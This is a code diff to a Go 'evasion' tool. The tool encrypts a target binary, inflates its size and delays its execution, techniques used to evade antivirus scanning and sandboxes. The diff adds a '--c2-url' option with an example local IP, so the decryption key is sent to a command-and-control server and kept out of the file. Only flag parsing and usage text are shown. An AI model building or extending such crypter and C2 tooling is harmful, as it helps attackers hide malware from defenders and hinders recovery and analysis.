@@ -19,12 +19,15 @@ func main() {
 		fmt.Fprintln(os.Stderr, "  --output  <output-binary>    Specify the output file path.")
 		fmt.Fprintln(os.Stderr, "  --add-size <size-in-mb>      Increase the binary size (e.g., 101 MB).")
 		fmt.Fprintln(os.Stderr, "  --delay   <seconds>          Execution delay in seconds (default: 101).")
+		fmt.Fprintln(os.Stderr, "  --c2-url <url>               Key server URL (e.g. http://192.168.56.1:8080).")
+		fmt.Fprintln(os.Stderr, "                               When set, the key is sent to the server and NOT stored in the file.")
 	}
 
 	encrypt := flag.String("encrypt", "", "target binary to encrypt")
 	output := flag.String("output", "", "output file path")
 	addSize := flag.Float64("add-size", 0, "padding to add in MB (e.g., 101)")
 	delay := flag.Float64("delay", 101, "execution delay in seconds")
+	c2url := flag.String("c2-url", "", "key server URL (key is NOT stored in file)")
 	flag.Parse()
 
 	if *encrypt == "" || *output == "" {
@@ -32,7 +35,7 @@ func main() {
 		os.Exit(2)
 	}
 
-	if err := encryptAndBuild(*encrypt, *output, *addSize, *delay); err != nil {
+	if err := encryptAndBuild(*encrypt, *output, *addSize, *delay, *c2url); err != nil {
 		fmt.Fprintf(os.Stderr, "evasion: %v\n", err)
 		os.Exit(1)
 	}
